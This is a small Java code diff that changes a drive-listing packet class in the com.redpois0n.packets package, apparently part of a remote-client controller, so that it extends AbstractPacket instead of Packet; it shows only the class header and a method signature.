@@ -3,7 +3,7 @@ package com.redpois0n.packets;
 import com.redpois0n.Drive;
 import com.redpois0n.Slave;
 
-public class PacketDRIVES extends Packet {
+public class PacketDRIVES extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
